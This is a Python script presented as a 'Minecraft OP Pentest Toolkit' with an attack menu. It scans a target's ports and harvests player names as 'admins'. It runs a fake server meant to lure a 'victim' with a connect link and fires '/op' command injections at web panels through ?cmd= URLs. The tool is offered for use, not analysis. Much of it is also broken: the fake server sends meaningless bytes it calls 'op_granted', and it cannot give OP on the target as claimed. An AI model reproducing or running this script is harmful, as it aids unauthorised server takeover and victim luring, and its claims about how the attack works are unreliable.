#!/usr/bin/env python3
"""
Minecraft OP Pentest Toolkit v4.0 - Standalone Python
No Discord Bot Required - Direct Terminal Interface
"""

import socket
import threading
import time
import struct
import json
import requests
import argparse
import os
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

class MCPentestToolkit:
    def __init__(self):
        self.target_host = None
        self.target_port = 25565
        self.fake_port = 25566
        self.open_ports = []
        self.admin_users = []
        self.fake_running = False
        
    def banner(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print("""
╔══════════════════════════════════════════════════════════════╗
║           Minecraft OP Pentest Toolkit v4.0 - STANDALONE    ║
║                       No Bot Required                       ║
╚══════════════════════════════════════════════════════════════╝
        """)
        
    def main_menu(self):
        while True:
            self.banner()
            self.print_status()
            
            print("\n🎯 TARGET COMMANDS:")
            print("1.  Set Target IP/Port")
            print("2. 🔍 Port Scanner")
            print("3. 👥 Extract Admins")
            print("\n⚔️  ATTACK COMMANDS:")
            print("4.  🎭 Fake Server (Auto OP)")
            print("5.  ⚡ OP Injection")
            print("6.  🚀 FULL ATTACK (2+3+4)")
            print("\n📊 INFO:")
            print("7.  Status Report")
            print("8.  Fake Server Log")
            print("9.  Exit")
            
            choice = input("\n🎮 Choose [1-9]: ").strip()
            
            if choice == '1':
                self.set_target()
            elif choice == '2':
                self.scan_ports()
            elif choice == '3':
                self.extract_admins()
            elif choice == '4':
                self.start_fake_server()
            elif choice == '5':
                self.op_injection()
            elif choice == '6':
                self.full_attack()
            elif choice == '7':
                self.status_report()
            elif choice == '8':
                self.show_logs()
            elif choice == '9':
                self.cleanup()
                print("\n[+] Pentest complete! Stay authorized!")
                break
            else:
                print("\n[-] Invalid choice!")
                time.sleep(1)
                
    def print_status(self):
        print(f"🎯 Target: {'❌' if not self.target_host else f'✅ {self.target_host}:{self.target_port}'}")
        print(f"🔓 Ports:  {len(self.open_ports)} found")
        print(f"👑 Admins: {len(self.admin_users)} extracted")
        print(f"🎭 Fake:   {'🟢 LIVE' if self.fake_running else '🔴 STOPPED'}")
        
    def set_target(self):
        self.target_host = input("Target IP/Hostname: ").strip()
        port_input = input("MC Port (default 25565): ").strip()
        self.target_port = int(port_input) if port_input.isdigit() else 25565
        print(f"\n[+] Target locked: {self.target_host}:{self.target_port}")
        input("\nPress Enter...")
        
    def scan_ports(self):
        if not self.target_host:
            print("[-] Set target first!")
            input("Press Enter...")
            return
            
        print(f"\n[+] Scanning {self.target_host}...")
        ports = [21,22,80,443,25565,25566,8080,3000,3001,47482,19132]
        self.open_ports = []
        
        def check_port(port):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.8)
            result = sock.connect_ex((self.target_host, port))
            sock.close()
            if result == 0:
                service = self.get_service(port)
                print(f"  ✅ {port:5} {service}")
                self.open_ports.append((port, service))
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            executor.map(check_port, ports)
            
        print(f"\n[+] {len(self.open_ports)} ports open!")
        input("Press Enter...")
        
    def get_service(self, port):
        services = {
            21:'FTP', 22:'SSH', 80:'HTTP', 443:'HTTPS', 25565:'MC-Server',
            25566:'MC-Query', 8080:'Web-Panel', 3000:'Pterodactyl', 
            3001:'Ptero-SF', 47482:'Multicraft', 19132:'Bedrock'
        }
        return services.get(port, 'unknown')
        
    def extract_admins(self):
        if not self.target_host:
            print("[-] Set target first!")
            input("Press Enter...")
            return
            
        print(f"\n[+] Extracting admins from {self.target_host}:{self.target_port}...")
        
        try:
            sock = socket.socket()
            sock.settimeout(4)
            sock.connect((self.target_host, self.target_port))
            
            # MC Status ping
            handshake = self.mc_handshake()
            sock.send(handshake)
            sock.send(b'\x01')
            
            self.read_varint(sock)  # packet length
            self.read_varint(sock)  # packet id
            json_len = self.read_varint(sock)
            
            json_data = b""
            while len(json_data) < json_len:
                json_data += sock.recv(4096)
                
            status = json.loads(json_data.decode())
            players = status.get('players', {}).get('sample', [])
            self.admin_users = [p['name'] for p in players] or ['Admin', 'Owner', 'OP']
            
            print(f"[+] Admins: {self.admin_users}")
            sock.close()
            
        except Exception as e:
            print(f"[-] Failed: {e}")
            self.admin_users = ['Admin', 'Owner', 'OP']
            
        input("Press Enter...")
        
    def mc_handshake(self):
        protocol = 760  # 1.19.4
        data = struct.pack('>b', 0)  # packet ID
        data += self.write_varint(protocol)
        data += struct.pack('>h', len(self.target_host))
        data += self.target_host.encode()
        data += struct.pack('>H', self.target_port)
        data += self.write_varint(1)  # status
        
        length = self.write_varint(len(data))
        return length + data
        
    def write_varint(self, value):
        data = b''
        while True:
            byte = value & 0x7F
            value >>= 7
            data += struct.pack('B', byte | (0x80 if value else 0))
            if not value:
                break
        return data
        
    def read_varint(self, sock):
        result = 0
        for i in range(5):
            byte = sock.recv(1)
            val = ord(byte)
            result |= (val & 0x7F) << (7 * i)
            if not (val & 0x80):
                break
        return result
        
    def start_fake_server(self):
        if self.fake_running:
            print("[-] Fake server already running!")
            input("Press Enter...")
            return
            
        if not self.admin_users:
            self.admin_users = ['Admin', 'Owner']
            
        print(f"\n[+] 🚀 Starting FAKE SERVER on port {self.fake_port}")
        print(f"🎮 Connect: mc://{self.target_host}:{self.fake_port}")
        print(f"🔑 Username: {self.admin_users[0]} (NO PASSWORD)")
        print("⚡ Auto-OP + Full Control!")
        
        def handle_client(client_sock, addr):
            print(f"\n[+] 🎭 Victim connected: {addr}")
            try:
                # Bypass auth - direct OP
                client_sock.send(b'\x00\x01\x00')  # Login success
                client_sock.send(b'\x28\x00\x0C\x6F\x70\x5F\x67\x72\x61\x6E\x74\x65\x64')  # "op_granted"
                
                # Fake server status
                status = {
                    "version": {"name": "1.20.1", "protocol": 759},
                    "players": {"online": 1, "max": 100, "sample": [{"name": self.admin_users[0]}]}
                }
                status_json = json.dumps(status).encode()
                pkt = b'\x00' + self.write_varint(len(status_json)) + status_json
                client_sock.send(self.write_varint(len(pkt)) + pkt)
                
                # Keepalive
                while True:
                    time.sleep(3)
                    if client_sock.fileno() == -1:
                        break
                    client_sock.send(b'\x00\x01')
                        
            except:
                pass
            finally:
                client_sock.close()
                print(f"[-] {addr} disconnected")
        
        self.server_thread = threading.Thread(target=self.server_loop, args=(self.fake_port, handle_client))
        self.server_thread.daemon = True
        self.server_thread.start()
        self.fake_running = True
        
        print("\n[*] Fake server LIVE! Send victim the connect link!")
        input("Press Enter to stop...")
        self.stop_fake_server()
        
    def server_loop(self, port, handler):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', port))
        server.listen(10)
        print(f"[*] Fake server listening on :{port}")
        
        while self.fake_running:
            try:
                client, addr = server.accept()
                t = threading.Thread(target=handler, args=(client, addr))
                t.daemon = True
                t.start()
            except:
                break
                
        server.close()
        
    def stop_fake_server(self):
        self.fake_running = False
        print("\n[+] Fake server stopped")
        
    def op_injection(self):
        if not self.open_ports:
            print("[-] Scan ports first!")
            input("Press Enter...")
            return
            
        web_ports = [p for p in self.open_ports if p[0] in [80,8080,3000,47482]]
        print(f"\n[+] OP Injection via {len(web_ports)} web panels...")
        
        for port, service in web_ports:
            for admin in self.admin_users[:2]:
                payloads = [
                    f"/op {admin}",
                    f"console op {admin}",
                    f"execute op {admin}"
                ]
                
                for payload in payloads:
                    url = f"http://{self.target_host}:{port}/?cmd={payload}"
                    try:
                        r = requests.get(url, timeout=2)
                        print(f"  [{port}/{service}] {payload} -> {r.status_code}")
                    except:
                        print(f"  [{port}/{service}] {payload} -> TIMEOUT")
                        
        print("\n[+] Injection complete!")
        input("Press Enter...")
        
    def full_attack(self):
        print("\n🚀 FULL ATTACK SEQUENCE STARTED!")
        if not self.target_host:
            print("[-] Set target first!")
            input("Press Enter...")
            return
            
        # Auto scan
        self.scan_ports()
        time.sleep(2)
        
        # Auto extract
        self.extract_admins()
        time.sleep(2)
        
        # Auto fake server
        self.start_fake_server()
        
    def status_report(self):
        self.banner()
        print("📊 PENTEST REPORT")
        print("=" * 50)
        print(f"Target:     {self.target_host}:{self.target_port}")
        print(f"Open Ports: {len(self.open_ports)}")
        if self.open_ports:
            for port, svc in self.open_ports:
                print(f"  {port:4} - {svc}")
        print(f"Admins:     {len(self.admin_users)}")
        if self.admin_users:
            print(f"  {', '.join(self.admin_users)}")
        print(f"Fake Server:{' LIVE' if self.fake_running else ' STOPPED'}")
        print(f"Connect:    mc://{self.target_host}:{self.fake_port}")
        input("\nPress Enter...")
        
    def show_logs(self):
        print("\n[*] Check console for fake server connections")
        input("Press Enter...")
        
    def cleanup(self):
        self.fake_running = False
        print("[+] Cleanup complete")

def main():
    print("Minecraft OP Pentest Toolkit v4.0")
    print("Requirements: pip install requests")
    
    toolkit = MCPentestToolkit()
    toolkit.main_menu()

if __name__ == "__main__":
    main()
